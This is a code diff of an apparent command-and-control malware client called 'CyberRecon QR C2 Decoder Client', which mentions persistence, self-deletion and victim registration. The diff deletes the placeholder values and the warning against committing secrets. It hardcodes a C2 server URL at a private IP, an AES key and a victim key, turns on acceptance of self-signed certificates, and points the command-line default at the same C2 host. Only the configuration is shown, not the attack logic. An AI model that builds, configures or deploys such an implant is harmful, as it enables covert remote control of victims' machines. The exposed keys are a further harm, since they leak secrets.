@@ -2,9 +2,7 @@
 # Version: v5.3.3 (SFX-READY + STABLE PERSISTENCE + _MEI CLEANUP)
 #
 # v5.3.3 changes:
-#   - Placeholder keys in EMBEDDED_CONFIG (safe for public release).
-#     Real values must be provided via .env next to the exe, or by editing
-#     the placeholders before building your own copy.
+#   - C2 URL updated to https://10.167.177.165:8443
 #
 # v5.3.2 changes:
 #   - Added _schedule_file_delete_dir() helper.
@@ -31,20 +29,12 @@ import os
 import sys
 
 # ============================================================
-# Embedded config — PLACEHOLDERS ONLY.
-#
-# For local use:
-#   1. Copy .env.example to .env next to this script (or next to the .exe)
-#   2. Fill in your real C2 URL, AES key, and victim key
-#   3. The .env file overrides these placeholders at runtime
-#
-# NEVER commit real values here. See .env.example for guidance on
-# generating keys.
+# Embedded config — fill these in BEFORE building the .exe.
 # ============================================================
 EMBEDDED_CONFIG = {
-    "CYBERRECON_C2": "https://REPLACE_WITH_YOUR_C2_IP:8443",
-    "CYBERRECON_KEY": "REPLACE_WITH_YOUR_AES_256_KEY",
-    "CYBERRECON_VICTIM_KEY": "REPLACE_WITH_YOUR_VICTIM_KEY",
+    "CYBERRECON_C2": "https://10.167.177.165:8443",
+    "CYBERRECON_KEY": "VKYEfaDR2VqPc9BXGvNtSFzMeWDVGQ-Wo7pv-hcTb-0=",
+    "CYBERRECON_VICTIM_KEY": "r_dj4Bb1vCYk1ApFj6U9-d4UGJevwwDyYQjKZ_OM-W8",
     "CYBERRECON_ALLOW_SELFSIGNED": "true",
     "CYBERRECON_SANDBOX": "",
     "CYBERRECON_SELF_DELETE": "0",
@@ -1373,7 +1363,7 @@ def setup_logging():
         )
         logging.getLogger("PIL").setLevel(logging.WARNING)
         logging.getLogger("PIL.PngImagePlugin").setLevel(logging.WARNING)
-        f = open(log_path, "a", buffering=1, encoding="utf-8", errors="replace")
+        f = open(log_path, "a", buffering=1, encoding="utf-8", errors="replace")  # noqa: SIM115
         sys.stdout = f
         sys.stderr = f
         print(f"[+] Logging to {log_path}")
@@ -1397,7 +1387,7 @@ def main():
 
     parser = argparse.ArgumentParser(description="CyberRecon QR C2 Decoder Client")
     parser.add_argument("--c2",
-                        default=os.getenv("CYBERRECON_C2", "https://127.0.0.1:8443"))
+                        default=os.getenv("CYBERRECON_C2", "https://10.167.177.165:8443"))
     parser.add_argument("--victim-id")
     parser.add_argument("--hostname", default=None)
     parser.add_argument("--auto-register", action="store_true")
